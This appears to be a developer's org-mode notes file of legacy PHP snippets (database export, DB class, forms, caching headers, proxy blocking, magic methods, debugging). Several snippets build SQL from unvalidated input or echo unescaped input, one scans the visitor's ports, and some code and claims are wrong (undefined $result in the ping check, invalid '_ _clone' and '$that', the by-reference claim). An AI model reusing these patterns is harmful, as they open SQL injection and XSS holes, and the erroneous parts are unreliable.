                        $html .= "null; \r\n";
                } ELSE IF ($value === TRUE) {
                        $html .= "true; \r\n";
                } ELSE {
                        $html .= $value . "; \r\n";
                }
        }
 
        RETURN $html;
}
 
?>
#+end_src

** Universal parameter reading

#+begin_src php
<?PHP
 
FUNCTION param($Name)
{
  GLOBAL $HTTP_GET_VARS;
  GLOBAL $HTTP_POST_VARS;
  GLOBAL $HTTP_COOKIE_VARS;

  IF(ISSET($HTTP_GET_VARS[$Name]))
    RETURN($HTTP_GET_VARS[$Name]);

  IF(ISSET($HTTP_POST_VARS[$Name]))
    RETURN($HTTP_POST_VARS[$Name]);

  IF(ISSET($HTTP_COOKIE_VARS[$Name]))
    RETURN($HTTP_COOKIE_VARS[$Name]);

  RETURN("");
}                

?>
#+end_src

** Heavy Duty URL validator
#+begin_src php
<?PHP
 
$valid = "^(https?|ftp)\:\/\/([a-z0-9+!*(),;?&=\$_.-]+(\:[a-z0-9+!*(),;?&=\$_.-]+)?@)?[a-z0-9+\$_-]+(\.[a-z0-9+\$_-]+)*(\:[0-9]{2,5})?(\/([a-z0-9+\$_-]\.?)+)*\/?(\?[a-z+&\$_.-][a-z0-9;:@/&%=+\$_.-]*)?(#[a-z_.-][a-z0-9+\$_.-]*)?\$";
 
?>
#+end_src

** Create thumbnails with PHP
#+begin_src php
<?PHP
 
FUNCTION thumbnail($image_path,$thumb_path,$image_name,$thumb_width) 
{ 
    $src_img = imagecreatefromjpeg("$image_path/$image_name"); 
    $origw=imagesx($src_img); 
    $origh=imagesy($src_img); 
    $new_w = $thumb_width; 
    $diff=$origw/$new_w; 
    $new_h=$new_w; 
    $dst_img = imagecreate($new_w,$new_h); 
    imagecopyresized($dst_img,$src_img,0,0,0,0,$new_w,$new_h,imagesx($src_img),imagesy($src_img)); 
 
    imagejpeg($dst_img, "$thumb_path/$image_name"); 
    RETURN TRUE; 
} 
 
?>
#+end_src

** Export table to Excel or MS Word file
#+begin_src php
<?PHP
 
//EDIT YOUR MySQL Connection Info:
$DB_Server = "";        //your MySQL Server
$DB_Username = "";                 //your MySQL User Name
$DB_Password = "";                //your MySQL Password
$DB_DBName = "";                //your MySQL Database Name
$DB_TBLName = "";                //your MySQL Table Name
 
//$DB_TBLName,  $DB_DBName, may also be commented out & passed to the browser
//as parameters in a query string, so that this code may be easily reused for
//any MySQL table or any MySQL database on your server
 
//DEFINE SQL QUERY:
//edit this to suit your needs
$sql = "Select * from $DB_TBLName";
 
//Optional: print out title to top of Excel or Word file with Timestamp
//for when file was generated:
//set $Use_Titel = 1 to generate title, 0 not to use title
$Use_Title = 1;
//define date for title: EDIT this to create the time-format you need
$now_date = DATE('m-d-Y H:i');
//define title for .doc or .xls file: EDIT this if you want
$title = "Dump For Table $DB_TBLName from Database $DB_DBName on $now_date";
/*
 
Leave the connection info below as it is:
just edit the above.
 
(Editing of code past this point recommended only for advanced users.)
*/
//create MySQL connection
$Connect = @MYSQL_CONNECT($DB_Server, $DB_Username, $DB_Password)
     or DIE("Couldn't connect to MySQL:<br>" . MYSQL_ERROR() . "<br>" . MYSQL_ERRNO());
//select database
$Db = @MYSQL_SELECT_DB($DB_DBName, $Connect)
     or DIE("Couldn't select database:<br>" . MYSQL_ERROR(). "<br>" . MYSQL_ERRNO());
//execute query
$result = @MYSQL_QUERY($sql,$Connect)
     or DIE("Couldn't execute query:<br>" . MYSQL_ERROR(). "<br>" . MYSQL_ERRNO());
 
//if this parameter is included ($w=1), file returned will be in word format ('.doc')
//if parameter is not included, file returned will be in excel format ('.xls')
IF (ISSET($w) && ($w==1))
{
     $file_type = "msword";
     $file_ending = "doc";
}ELSE {
     $file_type = "vnd.ms-excel";
     $file_ending = "xls";
}
//header info for browser: determines file type ('.doc' or '.xls')
HEADER("Content-Type: application/$file_type");
HEADER("Content-Disposition: attachment; filename=database_dump.$file_ending");
HEADER("Pragma: no-cache");
HEADER("Expires: 0");
 
/*    Start of Formatting for Word or Excel    */
 
IF (ISSET($w) && ($w==1)) //check for $w again
{
     /*    FORMATTING FOR WORD DOCUMENTS ('.doc')   */
     //create title with timestamp:
     IF ($Use_Title == 1)
     {
         ECHO("$title\n\n");
     }
     //define separator (defines columns in excel & tabs in word)
     $sep = "\n"; //new line character
 
     WHILE($row = MYSQL_FETCH_ROW($result))
     {
         //set_time_limit(60); // HaRa
         $schema_insert = "";
         FOR($j=0; $j<mysql_num_fields($result);$j++)
         {
         //define field names
         $field_name = MYSQL_FIELD_NAME($result,$j);
         //will show name of fields
         $schema_insert .= "$field_name:\t";
             IF(!ISSET($row[$j])) {
                 $schema_insert .= "NULL".$sep;
                 }
             ELSEIF ($row[$j] != "") {
                 $schema_insert .= "$row[$j]".$sep;
                 }
             ELSE {
                 $schema_insert .= "".$sep;
                 }
         }
         $schema_insert = STR_REPLACE($sep."$", "", $schema_insert);
         $schema_insert .= "\t";
         PRINT(TRIM($schema_insert));
         //end of each mysql row
         //creates line to separate data from each MySQL table row
         PRINT "\n----------------------------------------------------\n";
     }
}ELSE{
     /*    FORMATTING FOR EXCEL DOCUMENTS ('.xls')   */
     //create title with timestamp:
     IF ($Use_Title == 1)
     {
         ECHO("$title\n");
     }
     //define separator (defines columns in excel & tabs in word)
     $sep = "\t"; //tabbed character
 
     //start of printing column names as names of MySQL fields
     FOR ($i = 0; $i < MYSQL_NUM_FIELDS($result); $i++)
     {
         ECHO MYSQL_FIELD_NAME($result,$i) . "\t";
     }
     PRINT("\n");
     //end of printing column names
 
     //start while loop to get data
     WHILE($row = MYSQL_FETCH_ROW($result))
     {
         //set_time_limit(60); // HaRa
         $schema_insert = "";
         FOR($j=0; $j<mysql_num_fields($result);$j++)
         {
             IF(!ISSET($row[$j]))
                 $schema_insert .= "NULL".$sep;
             ELSEIF ($row[$j] != "")
                 $schema_insert .= "$row[$j]".$sep;
             ELSE
                 $schema_insert .= "".$sep;
         }
         $schema_insert = STR_REPLACE($sep."$", "", $schema_insert);
         //following fix suggested by Josue (thanks, Josue!)
         //this corrects output in excel when table fields contain \n or \r
         //these two characters are now replaced with a space
         $schema_insert = PREG_REPLACE("/\r\n|\n\r|\n|\r/", " ", $schema_insert);
         $schema_insert .= "\t";
         PRINT(TRIM($schema_insert));
         PRINT "\n";
     }
}
 
?>
#+end_src

** Simple DB connection class
#+begin_src php
<?PHP
 
CLASS DB_Class {
 
     VAR $db;
     ///////////////////////////
     FUNCTION DB_Class($dbname, $username, $password) {
          $this->db = MYSQL_CONNECT ('localhost', $username, $password)
           or DIE ("Unable to connect to Database Server");
 
          MYSQL_SELECT_DB ($dbname, $this->db) or DIE ("Could not select database");
     }
 
     FUNCTION query($sql) {
          $result = MYSQL_QUERY ($sql, $this->db) or DIE ("Invalid query: " . MYSQL_ERROR());
          RETURN $result;
     }
     ///////////////////////////
     FUNCTION fetch($sql) {
          $data = ARRAY();
          $result = $this->query($sql);
 
          WHILE($row = MYSQL_FETCH_ASSOC($result)) {
               $data[] = $row;
          }
               RETURN $data;
     }
     ///////////////////////////
     FUNCTION getone($sql) {
     $result = $this->query($sql);
 
     IF(MYSQL_NUM_ROWS($result) == 0)
          $value = FALSE;
     ELSE
          $value = MYSQL_RESULT($result, 0);
          RETURN $value;
     }
     ///////////////////////////
}
?>
 
// usage example....
 
<?PHP
 
$dbconnect = NEW DB_Class('table', 'user', 'password');
$query = "SELECT user_id FROM user_table WHERE $match = $search ORDER BY user_id DESC";
$result = $dbconnect->fetch($query);
 
?> 
#+end_src

** Language Specific Response
#+begin_src php
 <?PHP
 
$languages_supported_by_browser=$_SERVER["HTTP_ACCEPT_LANGUAGE"];
 
$pos=STRPOS($languages_supported_by_browser,";");
 
IF ($pos>0) {
    $languages_supported_by_browser =
        SUBSTR($languages_supported_by_browser,0,$pos);
}
 
$languages=SPLIT(",",$languages_supported_by_browser);
 
ECHO "First language supported by browser is: ".
        $languages[0].".";
 
?>
 
 
#+end_src

** Delete all cookies set
#+begin_src php
<?PHP
 
FOREACH($_COOKIE AS $key => $value) {
     SETCOOKIE($key,$value,TIME()-10000,"/",".domain.com");
}
 
?>
#+end_src

** Find the current URL of the page
#+begin_src php
<?PHP
 
FUNCTION getCurrentPage() {
     $thedomain .= "http://";
     $thedomain .= $_SERVER['HTTP_HOST'];
     $thedomain .= $_SERVER['REQUEST_URI'];
     RETURN $thedomain ;
}
 
ECHO "The current URL is: ".getCurrentPage()."!";
 
?>
#+end_src

** Check if a URL exists with cURL
#+begin_src php
function urlExists($url=NULL)
	{
		if($url == NULL) return false;
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_TIMEOUT, 5);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$data = curl_exec($ch);
		$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch); 
		if($httpcode>=200 && $httpcode<300){
			return true;
		} else {
			return false;
		}
	}
#+end_src

** Issue a ping command from a PHP script
#+begin_src php 
<?php
$str = exec("ping -c 1 www.google.com");
if ($result == 0){
  echo "ping succeeded";
}else{
  echo "ping failed";
}
?>
#+end_src

** Handle comma separated input
The code below will turn your POST variable into an array containing the user’s
input which you can further validate or store in a database. This is useful for
letting users add tags to items on your website
#+begin_src php
$tagsString = isset($_POST['tags']) ? (string)strip_tags($_POST['tags']) : '';
if ($tagsString != '') {
	$tags_array = explode(",", $tagsString);
	$tags_array = array_unique($tags_array); //no dups, please
	foreach($tags_array AS $key => $tag)
	{
		$tag = trim(stripslashes($tag));
		if($tag == '') continue; //skips if empty
		echo $key.' - '.$tag;
	}
}
#+end_src

** Check image type in PHP
if you’re looking to determine the type of uploaded image you can use the following code:

#+begin_src php
$type = exif_imagetype($_FILES['uploaded_image']['tmp_name']);
if ($type == 1 || $type == 2 || $type == 3)
{
//image type is jpg, gif or png
}
#+end_src

** Write to STDERR in a PHP script
just use the PHP fwrite function like this:
#+begin_src php
fwrite(STDERR, “hello, world\n”);
#+end_src 

Or, in a more real-world example, here's how I'm writing MySQL error messages to
STDERR in PHP:
#+begin_src php 
fwrite(STDERR, "MySQL INSERT error on \"INSERT INTO files\" statement: " . mysql_error());
#+end_src 

** A simple PHP form example
#+begin_src php
<?php
// created by alvin alexander, http://devdaily.com
$first_name = $_POST["first_name"];
$last_name = $_POST["last_name"];
?>

<html>
<head>
<title>Simple PHP Form Example</title>
</head>

<body>

<?php
if (!isset($_POST['submit']))
{
  // display the form
  ?>
  <p>
  <form method="post" action="<?php echo $PHP_SELF;?>">
  First Name: <input type="text" name="first_name">
  <br/>Last Name: <input type="text" name="last_name">
  <br/><input type="submit" value="submit" name="submit">
  </form>
  </p>

<?
}
else
{
  // display the output
  echo "<p>";
  echo "First Name: $first_name<br />";
  echo "Last Name: $last_name<br />";
  echo "</p>";
}
?>

</body>
</html>
#+end_src

** read command line arguments
You just need to access the PHP argv array, as shown in this example:
#+begin_src php 
#!/usr/bin/php
<?php
// loop through each element in the $argv array
foreach($argv as $value)
{
  echo "$value\n";
}
?>
#+end_src 

If I save this file as argtest.php, and then run it, like this:

#+begin_src shell
php argtest.php foo bar baz
# I'll get the following output from the script:
argtest.php
foo
bar
baz
#+end_src 

** Remote file_exist()
#+begin_src php
<?PHP
 
FUNCTION remote_file_exists($url){
    RETURN (bool)PREG_MATCH('~HTTP/1\.\d\s+200\s+OK~', @CURRENT(get_headers($url)));
}  
 
?>
#+end_src

** the protocol that is being used to serve the request

#+begin_src php
protected static function getProtocol() 
{ 
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://"; 
    return $protocol; 
} 
#+end_src 

** PHP/jQuery Ajax testing template
#+begin_src php
<?php
 
if (isset($_GET['ajax'])) {
    if (!isset($_POST['action'])) {
        exit;
    }
 
    switch ($_POST['action']) {
        case 'demo1':            
            echo json_encode(array('test' => 'Hello world!'));
            break;
        default:
            break;
    }
 
    exit;
}
 
?><!DOCTYPE html>
 
<html>
 
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>Ajax testing template</title>
        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"></script>
 
        <script type="text/javascript">
 
            function ajaxCallDemo1()
            {
                $.ajax({
                    type     : "POST",
                    async    : true,
                    url      : "?ajax",
                    cache    : false,
                    data     : {action      : 'demo1'},
                    dataType : 'json',
                    success: function(data) {
                        $('#demo1').html(data['test']);
                    },
                    error: function() {
                        alert("Something went wrong");
                    }
                });
            }
 
            $(document).ready(function() {                
                ajaxCallDemo1();
            });
 
        </script>
    </head>
 
    <body>
        <div id="demo1"></div>
    </body>
 
</html>
#+end_src

** detect if we are running with *SSL* enabled
#+begin_src php 
/**
 * Detect if Collabtive runs on HTTP or HTTPS
 */
function detectSSL()
{
    if (getArrayVal($_SERVER, "https") == "on") {
        return true;
    } elseif (getArrayVal($_SERVER, "https") == 1) {
        return true;
    } elseif (getArrayVal($_SERVER, "HTTPS") == 'on') {
        return true;
    } elseif (getArrayVal($_SERVER, "HTTPS") == 1) {
        return true;
    } elseif (getArrayVal($_SERVER, "SERVER_PORT") == 443) {
        return true;
    } else {
        return false;
    }
}
#+end_src

** detect current url
#+begin_src php
/**
 * Get the URL Collabtive is running on
 */
function getMyUrl()
{
    if (isset($_SERVER['REQUEST_URI']) && !empty($_SERVER['REQUEST_URI'])) {
        $requri = $_SERVER['REQUEST_URI'];
    } else {
        // assume IIS
        $requri = $_SERVER['SCRIPT_NAME'];
        if (isset($_SERVER['QUERY_STRING']) && !empty($_SERVER['QUERY_STRING'])) {
            $requri .= '?' . $_SERVER['QUERY_STRING'];
        }
    }
    $host = $_SERVER['HTTP_HOST'];
    $pos1 = strrpos($requri, "/");
    $requri = substr($requri, 0, $pos1 + 1);
    if (detectSSL()) {
        $host = "https://" . $host;
    } else {
        $host = "http://" . $host;
    }
    $url = $host . $requri;

    return $url;
}
#+end_src

** get links from url
#+begin_src php
function PIPHP_RelToAbsURL($page, $url)
{
  if (substr($page, 0, 7) != "http://") return $url;

  $parse = parse_url($page);
  $root = $parse['scheme'] . "://" . $parse['host'];
  $p = strrpos(substr($page, 7), '/');

  if ($p) $base = substr($page, 0, $p + 8);
  else $base = "$page/";

  if (substr($url, 0, 1) == '/') $url = $root . $url;
  elseif (substr($url, 0, 7) != "http://") $url = $base . $url;

  return $url;
}

function PIPHP_GetLinksFromURL($page)
{
$contents = @file_get_contents($page);
if (!$contents) return NULL;

  $urls = array();
  $dom = new domdocument();
  @$dom ->loadhtml($contents);
  $xpath = new domxpath($dom);
  $hrefs = $xpath->evaluate("/html/body//a");

  for ($j = 0 ; $j < $hrefs->length ; $j++)
    $urls[$j] = PIPHP_RelToAbsURL($page, $hrefs->item($j)->getAttribute('href'));

  return $urls;
}
#+end_src 

** directory list 
#+begin_src php 
function PIPHP_DirectoryList($path)
{
  $files = array();
  $dirs = array();
  $fnum = $dnum = 0;

  if (is_dir($path))
  {
    $dh = opendir($path);
    do
    {
      $item = readdir($dh);
      if ($item !== FALSE && $item != "." && $item != "..")
      {
          if (is_dir("$path/$item")) $dirs[$dnum++] = $item;
          else $files[$fnum++] = $item;
      }
    } while($item !== FALSE);
    closedir($dh);
  }
  return array($dnum, $fnum, $dirs, $files);
}
#+end_src

** hit counter
#+begin_src php
function PIPHP_HitCounter($filename, $action)
{
  $data = getenv("REMOTE_ADDR") . getenv("HTTP_USER_AGENT") . "\n";
  switch ($action)
  {
    case "reset":
      $fp = fopen($filename, "w");
      if (flock($fp, LOCK_EX))
          ;
      flock($fp, LOCK_UN);
      fclose($fp);
      return;

    case "add":
      $fp = fopen($filename, "a+");
      if (flock($fp, LOCK_EX))
      fwrite($fp, $data);
      flock($fp, LOCK_UN);
      fclose($fp);
      return;

    case "get":
      $fp = fopen($filename, "r");
      if (flock($fp, LOCK_EX))
      $file = fread($fp, filesize($filename) - 1);
      flock($fp, LOCK_UN);
      fclose($fp);
      $lines = explode("\n", $file);
      $raw = count($lines);
      $unique = count(array_unique($lines));
      return array($raw, $unique);

    case "delete":
      unlink($filename);
      return;
  }
}
#+end_src 

** PHP command line syntax checking
*** Syntax checking a single PHP file from the command line
The syntax for checking is like this, where the -l flag is a lower case L:

#+begin_src shell
php -l filename
#+end_src 

*** Syntax check all PHP files in the current directory
#+begin_src shell 
for i in *.php; do php -l $i; done
#+end_src 

*** Syntax check all PHP files in the current directory and all subdirectories
#+begin_src shell 
find . -name \*.php -exec php -l "{}" \;
#+end_src 

** Disable PHP in a directory with Apache .htaccess

If you have a directory which users can upload files into it's a good idea for
security reasons to disable server-side parsing of scripts such as PHP. This
post shows a couple of options using Apache's .htaccess files.

*RemoveHandler and RemoveType*

The handlers for PHP are added using AddType in the Apache configuration, and
should be able to be removed in a .htaccess file like so (adding whatever
additional extensions you need):

#+begin_src 
RemoveHandler .php .phtml .php3
RemoveType .php .phtml .php3
#+end_src 

*php_flag engine off*
Another way to disable PHP in a .htaccess file is by adding a line like this:
#+begin_src 
php_flag engine off
#+end_src 

*To be on the safe side*
#+begin_src 
RemoveHandler .php .phtml .php3
RemoveType .php .phtml .php3
php_flag engine off
#+end_src 

** PHP Caching Headers
*Make sure a page is never cached with PHP*

To make sure the page is never cached (or whatever other dynamic content
generated from PHP such as images, RSS files etc) add the following to the start
of your script:

#+begin_src php
$ts = gmdate("D, d M Y H:i:s") . " GMT";
header("Expires: $ts");
header("Last-Modified: $ts");
header("Pragma: no-cache");
header("Cache-Control: no-cache, must-revalidate");
#+end_src 

*To set the amount of time to cache*

If instead you want the output from the script to be cached for a certain amount
of time, set the expires header to a time in the future. For example, to make it
so the browser will cache the output for 1 hour do this:
#+begin_src php 
$seconds_to_cache = 3600;
$ts = gmdate("D, d M Y H:i:s", time() + $seconds_to_cache) . " GMT";
header("Expires: $ts");
header("Pragma: cache");
header("Cache-Control: max-age=$seconds_to_cache");
#+end_src 

The Cache-Control header requires the number of seconds to cache the file so in
this example it's 3600 because 60 seconds x 60 minutes = 3600.

** block proxy visits via HTTP header
#+begin_src php
function shapeSpace_block_proxy_visits() {
	
	$headers = array('CLIENT_IP','FORWARDED','FORWARDED_FOR','FORWARDED_FOR_IP','VIA','X_FORWARDED','X_FORWARDED_FOR','HTTP_CLIENT_IP','HTTP_FORWARDED','HTTP_FORWARDED_FOR','HTTP_FORWARDED_FOR_IP','HTTP_PROXY_CONNECTION','HTTP_VIA','HTTP_X_FORWARDED','HTTP_X_FORWARDED_FOR');
	
	foreach ($headers as $header){
		if (isset($_SERVER[$header])) {
			die('Proxy access not allowed.');
		}
	}
}
#+end_src

** Block proxy visits via port scanning
#+begin_src php
function shapeSpace_block_proxy_visits() {
	
	$ports = array(80,81,553,554,1080,3128,4480,6588,8000,8080);

	foreach ($ports as $port) {
		if (@fsockopen($_SERVER['REMOTE_ADDR'], $port, $errno, $errstr, 5)) {
			die('Proxy access not allowed.');
		}
	}
}
#+end_src

** How to Block Proxy Servers via htaccess

By simply blacklisting the various HTTP protocols employed by proxy servers, it
is possible to block virtually all proxy connections. Here is the code that I
use for stopping 99% of the proxies that attempt to access certain sites:

#+begin_src
# block proxy servers from site access
# https://perishablepress.com/press/2008/04/20/how-to-block-proxy-servers-via-htaccess/

RewriteEngine on
RewriteCond %{HTTP:VIA}                 !^$ [OR]
RewriteCond %{HTTP:FORWARDED}           !^$ [OR]
RewriteCond %{HTTP:USERAGENT_VIA}       !^$ [OR]
RewriteCond %{HTTP:X_FORWARDED_FOR}     !^$ [OR]
RewriteCond %{HTTP:PROXY_CONNECTION}    !^$ [OR]
RewriteCond %{HTTP:XPROXY_CONNECTION}   !^$ [OR]
RewriteCond %{HTTP:HTTP_PC_REMOTE_ADDR} !^$ [OR]
RewriteCond %{HTTP:HTTP_CLIENT_IP}      !^$
RewriteRule ^(.*)$ - [F]
#+end_src

** Controlling Proxy Access with HTAccess
#+begin_src
RewriteCond %{HTTP_REFERER} !(.*)allowed-proxy-01.domain.tld(.*)
RewriteCond %{HTTP_REFERER} !(.*)allowed-proxy-02.domain.tld(.*)
RewriteCond %{HTTP_REFERER} !(.*)allowed-proxy-03.domain.tld(.*)
#+end_src 
Each line matches against the specified proxy server in the referrer variable.
Once integrated into the original method, each of the three specified URI’s will
be allowed access to your site. Thus, by editing these directives to match the
name and number of your whitelisted proxy servers, you can allow access to any
list of proxies or other referrers while blocking many of the others.

To integrate your customized whitelist RewriteConditions with the original
proxy-block method, simply place them near the end of the existing conditions,
directly above the RewriteRule, like so:

#+begin_src
<IfModule mod_rewrite.c>
 RewriteEngine on
 RewriteCond %{HTTP:VIA}                 !^$ [OR]
 RewriteCond %{HTTP:FORWARDED}           !^$ [OR]
 RewriteCond %{HTTP:USERAGENT_VIA}       !^$ [OR]
 RewriteCond %{HTTP:X_FORWARDED_FOR}     !^$ [OR]
 RewriteCond %{HTTP:PROXY_CONNECTION}    !^$ [OR]
 RewriteCond %{HTTP:XPROXY_CONNECTION}   !^$ [OR]
 RewriteCond %{HTTP:HTTP_PC_REMOTE_ADDR} !^$ [OR]
 RewriteCond %{HTTP:XROXY_CONNECTION}    !^$ [OR]
 RewriteCond %{HTTP:X-FORWARDED-FOR}     !^$ [OR]
 RewriteCond %{HTTP:HTTP_CLIENT_IP}      !^$ [OR]
 RewriteCond %{HTTP:FORWARDED-FOR}       !^$ [OR]
 RewriteCond %{HTTP:X-FORWARDED}         !^$
 RewriteCond %{HTTP_REFERER}             !(.*)allowed-proxy-01.domain.tld(.*)
 RewriteCond %{HTTP_REFERER}             !(.*)allowed-proxy-02.domain.tld(.*)
 RewriteCond %{HTTP_REFERER}             !(.*)allowed-proxy-03.domain.tld(.*)
 RewriteRule ^(.*)$ - [F]
</IfModule>
#+end_src

** BH load module
#+begin_src php
function load_module($filename)
{
    ob_start();
    include $filename;
    $ret = ob_get_clean();
    return $ret;
}
#+end_src

* json
** json encode raw UTF?

#+begin_src php 
json_encode( $text, JSON_UNESCAPED_UNICODE );
#+end_src 

* webservice
** types of webservices
*** SOAP

SOAP is an acronym for Simple Object Access Protocol.

SOAP is a XML-based protocol for accessing web services.

SOAP is a W3C recommendation for communication between applications.

SOAP is XML based, so it is platform independent and language
independent. In other words, it can be used with Java, .Net or PHP
language on any platform.

*** WSDL

WSDL is an acronym for Web Services Description Language.

WSDL is a xml document containing information about web services such
as method name, method parameter and how to access it.

WSDL is a part of UDDI. It acts as a interface between web service applications.

WSDL is pronounced as wiz-dull.

* classes
** static attributes or methods.
A static property is a class variable that is associated with the class, rather than with an
instance of the class.

Static properties are declared with the static keyword and are
accessed via the syntax ClassName::$property .The following example illustrates
how static properties work:

#+begin_src php
class TestClass {
   public static $counter;
}
$counter = TestClass::$counter;
#+end_src

If you need to access a static property inside a class, you can also use the magic keywords
self and parent , which resolve to the current class and the parent of the current class.

#+begin_src php
class TestClass {
   public static $counter = 0;
      public $id;
   public function _ _construct()
   {
      $this->id = self::$counter++;
    }
}
#+end_src

** ~__clone~ magic method

To actually copy an object in PHP5, you need to use the built-in _ _ clone()
method.

#+begin_src php
$obj = new TestClass;
$copy = $obj->_ _clone();
#+end_src

For some classes, the built-in deep-copy _ _clone() method may not be adequate for
your needs, so PHP allows you to override it. Inside the _ _clone() method, you not
only have $this , which represents the new object, but also $that , which is the object
being cloned. For example, in the TestClass class defined previously in this chapter, if
you use the default _ _clone() method, you will copy its id property. Instead, you
should rewrite the class as follows:

#+begin_src php
class TestClass {
   public static $counter = 0;
   public $id;
   public $other;
   public function _ _construct()
   {
      $this->id = self::$counter++;
   }
   public function _ _clone()
   {
      $this->other = $that->other;
      $this->id = self::$counter++;
   }
}
#+end_src
 
** passing objects as function parameters.
objects are always passed by reference. This means that when you pass an object
into a function, the function operates on that same object, and if it is changed
inside the function, that change is reflected outside.
** Using Magic ~__get~ and ~__set~ Methods
These are called when you access a property that doesn’t exist.

#+begin_src php
class Courier
{
  protected $data = array();
  public function __get($property) {
    return $this->data[$property];
  }
  public function __set($property, $value) {
    $this->data[$property] = $value;
    return true;
  }
}

$courier = new Courier();
$courier->name = 'Avian Carrier';
echo $courier->name;
#+end_src

** counting objects
By default, if you count() an object in PHP, you’ll receive a count of how many
properties it has. However, by implementing the Countable interface as shown below
allows us to hook into this.

#+begin_src php
class Courier implements Countable
{
  protected $count = 0;
  public function ship(Parcel $parcel) {
    $this->count++;
    // ship parcel
    return true;
  }
  public function count() {
    return $this->count;
  }
}

$courier = new Courier();
$courier->ship(new Parcel());
$courier->ship(new Parcel());
$courier->ship(new Parcel());
echo count($courier); // outputs 3
#+end_src

** Using ~__call()~ and ~__callStatic()~
When we call a method that isn’t declared in the class, the ~__call()~ method is
called instead.

#+begin_src php
class Courier {
  public $name;
  public function __construct($name) {
    $this->name = $name;
    return true;
  }

  public function ship($parcel) {
    // sends the parcel to its destination
    return true;
  }
  
  public function __call($name, $params) {
    if($name == 'sendParcel') {
    // legacy system requirement, pass to newer send() method
      return $this->send($params[0]);
    } else {
      error_log('Failed call to ' . $name . ' in Courier class');
    return false;
    }
  }
}
#+end_src 

** serializing

To serialize data in PHP means to convert it into a text-based format that we can
store, for example, in a database.

#+begin_src php
$mycourier = new Courier('Avian Services', 'Australia');
var_dump($mycourier);
$s = serialize($mycourier);
#+end_src 

When we serialize an object, we can unserialize it in any system where the class
definition of the object is available. There are some object properties, however, that
we don’t want to serialize, because they’d be invalid in any other context. A good
example of this is a resource; a file pointer would make no sense if unserialized at
a later point, or on a totally different platform.

To help us deal with this situation, PHP provides the __sleep() and __wakeup()
methods, which are called when serializing and unserializing, respectively. These
methods allow us to name which properties to serialize, and fill in any that aren’t
stored when the object is “woken.”

#+begin_src php
class Courier {
  public $name;
  public $home_country;

  public function __construct($name, $home_country) {
    $this->name = $name;
    $this->home_country = $home_country;
    $this->logfile = $this->getLogFile();
    return true;
  }
  protected function getLogFile() {
      // error log location would be in a config file
      return fopen('/tmp/error_log.txt', 'a');
  }
  public function log($message) {
    if($this->logfile) {
      fputs($this->logfile, 'Log message: ' . $message . "\n");
    }
  }
  public function __sleep() {
    // only store the "safe" properties
    return array("name", "home_country");
  }
  public function __wakeup() {
    // properties are restored, now add the logfile
    $this->logfile = $this->getLogFile();
    return true;
  }
}
#+end_src 

* reflection
** retrieving the name of current function?

~__FUNCTION__~ returns only the name of the function.
while as ~__METHOD__~ returns the name of the class alongwith the name of the function.

#+begin_src php
class foo
{
  function print_func()
  {
            echo __FUNCTION__;
  }
  function print_method()
  {
            echo __METHOD__;
  }
}

$obj = new foo();
$obj->print_func();      // Returns: print_func
$obj->print_method();    // Returns: foo::print_method
//using namespace
class_exists("\\Whoops\\Exception\\ErrorException");
#+end_src
http://www.php.net/manual/en/language.constants.predefined.php
** get type of variable 

#+begin_src php
string gettype ( mixed $var );
<?php

$data = array(1, 1., NULL, new stdClass, 'foo');

foreach ($data as $value) {
    echo gettype($value), "\n";
}

?>
#+end_src 

The above example will output something similar to:

#+begin_src 
integer
double
NULL
object
string
#+end_src 

** property_exists
property_exists() example

#+begin_src php 
<?php

class myClass {
    public $mine;
    private $xpto;
    static protected $test;

    static function test() {
        var_dump(property_exists('myClass', 'xpto')); //true
    }
}

var_dump(property_exists('myClass', 'mine'));   //true
var_dump(property_exists(new myClass, 'mine')); //true
var_dump(property_exists('myClass', 'xpto'));   //true, as of PHP 5.3.0
var_dump(property_exists('myClass', 'bar'));    //false
var_dump(property_exists('myClass', 'test'));   //true, as of PHP 5.3.0
myClass::test();

?>
#+end_src

** check if a class has a property
   
#+begin_src php
bool property_exists ( mixed $class , string $property )
#+end_src

This function checks if the given property exists in the specified class.

Note: As opposed with isset(), property_exists() returns TRUE even if the
property has the value NULL.

Returns TRUE if the property exists, FALSE if it doesn't exist or NULL in case
of an error.

** Verify that the contents of a variable can be called as a function
#+begin_src php 
//  How to check a variable to see if it can be called
//  as a function.

//
//  Simple variable containing a function
//

function someFunction() 
{
}

$functionVariable = 'someFunction';
var_dump(is_callable($functionVariable, false, $callable_name));  // bool(true)
echo $callable_name, "\n";  // someFunction

//
//  Array containing a method
//

class someClass {

  function someMethod() 
  {
  }

}

$anObject = new someClass();
$methodVariable = array($anObject, 'someMethod');
var_dump(is_callable($methodVariable, true, $callable_name));  //  bool(true)
echo $callable_name, "\n";  //  someClass::someMethod
?>
#+end_src 

** call callback given as parameter
#+begin_src php
<?php
error_reporting(E_ALL);
function increment(&$var)
{
    $var++;
}

$a = 0;
call_user_func('increment', $a);
echo $a."\n";

// You can use this instead
call_user_func_array('increment', array(&$a));
echo $a."\n";
?>
#+end_src 

* Debug
** dump all variables?

Use get_defined_vars and/or get_defined_constants

#+begin_src php
$arr = get_defined_vars();
print_r($arr);
#+end_src

#+begin_src php
$a = print_r(var_dump($GLOBALS),1);
echo htmlspecialchars($a);
#+end_src

** send an error message to  the web server's error log or to a file.

#+begin_src php
bool error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] )
#+end_src

#+begin_src php
<?php
// Send notification through the server log if we can not
// connect to the database.
if (!Ora_Logon($username, $password)) {
    error_log("Oracle database not available!", 0);
}

// Notify administrator by email if we run out of FOO
if (!($foo = allocate_new_foo())) {
    error_log("Big trouble, we're all out of FOOs!", 1,
               "operator@example.com");
}

// another way to call error_log():
error_log("You messed up!", 3, "/var/tmp/my-errors.log");
?>
#+end_src

** enabling error reporting
   
#+begin_src php
ini_set("display_errors","1");
error_reporting(E_ALL);
#+end_src

** capture the result of ~var_dump()~ to string

You may want to check out var_export — while it doesn't provide the same output
as var_dump it does provide a second $return parameter which will cause it to
return its output rather than print it:
#+begin_src php 
$debug = var_export($my_var, true);
#+end_src 

